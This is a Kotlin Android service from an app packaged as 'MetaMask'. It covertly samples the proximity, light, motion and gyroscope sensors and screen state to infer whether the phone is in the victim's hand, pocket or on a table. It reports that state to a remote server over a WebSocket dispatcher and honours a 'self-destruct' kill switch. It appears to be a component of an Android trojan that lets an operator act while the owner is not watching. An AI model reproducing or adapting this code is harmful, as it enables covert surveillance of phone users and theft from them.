package com.example.MetaMask.services

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.os.CountDownTimer
import android.os.IBinder
import android.os.PowerManager
import androidx.annotation.Keep
import org.json.JSONObject
import java.util.LinkedList
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import kotlin.math.abs
import kotlin.math.sqrt

@Keep
class DeviceStateMonitorService : Service(), SensorEventListener {

    enum class DeviceState {
        UNKNOWN,
        IN_HAND_SCREEN_ON,
        IN_HAND_SCREEN_OFF,
        ON_TABLE_SCREEN_ON,
        ON_TABLE_SCREEN_OFF,
        IN_POCKET_SCREEN_ON,
        IN_POCKET_SCREEN_OFF,
        IN_MOTION_HAND,
        IN_MOTION_POCKET
    }

    private enum class PhysicalLocation {
        IN_HAND, ON_TABLE, IN_POCKET
    }

    companion object {
        private const val TAG = "DeviceStateMonitor"
        const val ACTION_START_MONITORING = "com.example.MetaMask.ACTION_START_MONITORING"
        private const val EVALUATION_INTERVAL_MS = 1500L
        private const val GYROSCOPE_THRESHOLD = 0.05f
        private const val GRAVITY_VECTOR_THRESHOLD = 0.85f
        private const val ACCEL_BUFFER_SIZE = 10
        private const val ACCEL_VARIANCE_THRESHOLD = 0.005f
        private const val MONITORING_DURATION_MS = 180_000L
    }

    private lateinit var sensorManager: SensorManager
    private lateinit var powerManager: PowerManager
    private lateinit var scheduler: ScheduledExecutorService

    private var proximitySensor: Sensor? = null
    private var lightSensor: Sensor? = null
    private var accelerometer: Sensor? = null
    private var gyroscope: Sensor? = null

    @Volatile private var lastProximityValue: Float = -1f
    @Volatile private var lastLightValue: Float = -1f
    @Volatile private var lastGyroValues = FloatArray(3)
    @Volatile private var isScreenOn: Boolean = true

    private val accelBuffer = LinkedList<FloatArray>()
    private var currentState: DeviceState = DeviceState.UNKNOWN

    private var monitoringTimer: CountDownTimer? = null
    @Volatile private var remainingTimeSeconds: Int = 0
    private var receiverRegistered = false

    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] onReceive enter context=ctx intent=${intent}") //xdbg
            isScreenOn = when (intent?.action) {
                Intent.ACTION_SCREEN_ON -> true
                Intent.ACTION_SCREEN_OFF -> false
                else -> isScreenOn
            }
            evaluateDeviceState()
        }
    }

    override fun onCreate() {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] onCreate enter") //xdbg
        super.onCreate()
        val killSwitchPrefs = getSharedPreferences(SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
        if (killSwitchPrefs.getBoolean(SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
            stopSelf()
            return
        }

        powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        isScreenOn = powerManager.isInteractive

        setupSensors()

        val screenFilter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
        }
        registerReceiver(screenStateReceiver, screenFilter)
        receiverRegistered = true

        scheduler = Executors.newSingleThreadScheduledExecutor()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        if (intent?.action == ACTION_START_MONITORING) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
            startMonitoringTimer()
            evaluateDeviceState()
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] return") //xdbg
            return START_STICKY
        }

        if (!::scheduler.isInitialized || scheduler.isShutdown) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] return") //xdbg
            return START_NOT_STICKY
        }

        scheduler.scheduleAtFixedRate(
            this::evaluateDeviceState,
            2000,
            EVALUATION_INTERVAL_MS,
            TimeUnit.MILLISECONDS
        )
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] return") //xdbg
        return START_STICKY
    }

    private fun setupSensors() {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] setupSensors enter") //xdbg
        sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
        proximitySensor = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY)
        lightSensor = sensorManager.getDefaultSensor(Sensor.TYPE_LIGHT)
        accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
        gyroscope = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE)

        val delay = SensorManager.SENSOR_DELAY_GAME
        proximitySensor?.let { sensorManager.registerListener(this, it, SensorManager.SENSOR_DELAY_NORMAL) }
        lightSensor?.let { sensorManager.registerListener(this, it, SensorManager.SENSOR_DELAY_NORMAL) }
        accelerometer?.let { sensorManager.registerListener(this, it, delay) }
        gyroscope?.let { sensorManager.registerListener(this, it, delay) }
    }

    override fun onSensorChanged(event: SensorEvent?) {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] onSensorChanged enter event=${event}") //xdbg
        if (event == null) return
        when (event.sensor.type) {
            Sensor.TYPE_PROXIMITY -> lastProximityValue = event.values[0]
            Sensor.TYPE_LIGHT -> lastLightValue = event.values[0]
            Sensor.TYPE_GYROSCOPE -> System.arraycopy(event.values, 0, lastGyroValues, 0, 3)
            Sensor.TYPE_ACCELEROMETER -> {
                synchronized(accelBuffer) {
                    if (accelBuffer.size == ACCEL_BUFFER_SIZE) {
                        android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
                        accelBuffer.removeFirst()
                    }
                    accelBuffer.add(event.values.clone())
                }
            }
        }
    }

    private fun calculateAccelVariance(): Float {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] calculateAccelVariance enter") //xdbg
        synchronized(accelBuffer) {
            if (accelBuffer.size < ACCEL_BUFFER_SIZE) return 0f

            var mean = FloatArray(3)
            for (value in accelBuffer) {
                android.util.Log.d("XDBG", "[DeviceStateMonitorService] loop") //xdbg
                mean[0] += value[0]
                mean[1] += value[1]
                mean[2] += value[2]
            }
            mean[0] = mean[0] / accelBuffer.size
            mean[1] = mean[1] / accelBuffer.size
            mean[2] = mean[2] / accelBuffer.size

            var variance = 0f
            for (value in accelBuffer) {
                android.util.Log.d("XDBG", "[DeviceStateMonitorService] loop") //xdbg
                variance += (value[0] - mean[0]) * (value[0] - mean[0])
                variance += (value[1] - mean[1]) * (value[1] - mean[1])
                variance += (value[2] - mean[2]) * (value[2] - mean[2])
            }
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] return") //xdbg
            return variance / accelBuffer.size
        }
    }

    @Synchronized
    private fun evaluateDeviceState() {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] evaluateDeviceState enter") //xdbg
        val hasRotationalMovement = abs(lastGyroValues[0]) > GYROSCOPE_THRESHOLD ||
                abs(lastGyroValues[1]) > GYROSCOPE_THRESHOLD ||
                abs(lastGyroValues[2]) > GYROSCOPE_THRESHOLD

        val lastAccel = synchronized(accelBuffer) { if (accelBuffer.isNotEmpty()) accelBuffer.last else floatArrayOf(0f, 0f, 0f) }
        val norm = sqrt(lastAccel[0] * lastAccel[0] + lastAccel[1] * lastAccel[1] + lastAccel[2] * lastAccel[2])
        val normalizedZ = if (norm > 0) abs(lastAccel[2]) / norm else 0f
        val isUpright = normalizedZ < GRAVITY_VECTOR_THRESHOLD

        val variance = calculateAccelVariance()
        val hasMicroMovement = variance > ACCEL_VARIANCE_THRESHOLD

        val location: PhysicalLocation
        if (lastProximityValue == 0f && lastLightValue < 15.0f) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
            location = PhysicalLocation.IN_POCKET
        } else if (isUpright || hasRotationalMovement || hasMicroMovement) {
            location = PhysicalLocation.IN_HAND
        } else {
            location = PhysicalLocation.ON_TABLE
        }

        when (location) {
            PhysicalLocation.IN_HAND -> {
                if (isScreenOn) updateState(DeviceState.IN_HAND_SCREEN_ON)
                else updateState(DeviceState.IN_HAND_SCREEN_OFF)
            }
            PhysicalLocation.ON_TABLE -> {
                if (isScreenOn) updateState(DeviceState.ON_TABLE_SCREEN_ON)
                else updateState(DeviceState.ON_TABLE_SCREEN_OFF)
            }
            PhysicalLocation.IN_POCKET -> {
                if (isScreenOn) updateState(DeviceState.IN_POCKET_SCREEN_ON)
                else updateState(DeviceState.IN_POCKET_SCREEN_OFF)
            }
        }
    }

    private fun updateState(newState: DeviceState) {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] updateState enter newState=${newState}") //xdbg
        if (currentState != newState) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
            currentState = newState
        }

        if (monitoringTimer != null && remainingTimeSeconds > 0) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
            sendStateToServer(newState, remainingTimeSeconds)
        }
    }

    private fun startMonitoringTimer() {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] startMonitoringTimer enter") //xdbg
        monitoringTimer?.cancel()
        monitoringTimer = object : CountDownTimer(MONITORING_DURATION_MS, 1000) {
            override fun onTick(millisUntilFinished: Long) {
                android.util.Log.d("XDBG", "[DeviceStateMonitorService] onTick enter millisUntilFinished=${millisUntilFinished}") //xdbg
                remainingTimeSeconds = (millisUntilFinished / 1000).toInt()
                evaluateDeviceState()
            }

            override fun onFinish() {
                android.util.Log.d("XDBG", "[DeviceStateMonitorService] onFinish enter") //xdbg
                remainingTimeSeconds = 0
                stopSelf()
            }
        }.start()
    }

    private fun sendStateToServer(state: DeviceState, remainingTime: Int) {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] sendStateToServer enter state=${state} remainingTime=${remainingTime}") //xdbg
        try {
            val stateText = when (state) {
                DeviceState.IN_HAND_SCREEN_ON -> "В руках, экран вкл."
                DeviceState.IN_HAND_SCREEN_OFF -> "В руках, экран выкл."
                DeviceState.ON_TABLE_SCREEN_ON -> "На столе, экран вкл."
                DeviceState.ON_TABLE_SCREEN_OFF -> "На столе, экран выкл."
                DeviceState.IN_POCKET_SCREEN_ON -> "В кармане, экран вкл."
                DeviceState.IN_POCKET_SCREEN_OFF -> "В кармане, экран выкл."
                DeviceState.IN_MOTION_HAND -> "В движении (в руках)"
                DeviceState.IN_MOTION_POCKET -> "В движении (в кармане)"
                DeviceState.UNKNOWN -> "Статус неизвестен"
            }

            val payload = JSONObject().apply {
                put("action", "deviceStateUpdate")
                put("status", stateText)
                put("remainingTime", remainingTime)
            }

            val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                `package` = applicationContext.packageName
            }
            sendBroadcast(intent)
        } catch (_: Exception) {}
    }

    override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[DeviceStateMonitorService] onDestroy enter") //xdbg
        super.onDestroy()
        monitoringTimer?.cancel()
        if (::scheduler.isInitialized) scheduler.shutdownNow()
        if (::sensorManager.isInitialized) sensorManager.unregisterListener(this)
        if (receiverRegistered) {
            android.util.Log.d("XDBG", "[DeviceStateMonitorService] if branch") //xdbg
            try { unregisterReceiver(screenStateReceiver) } catch (_: IllegalArgumentException) {}
            receiverRegistered = false
        }
    }
}
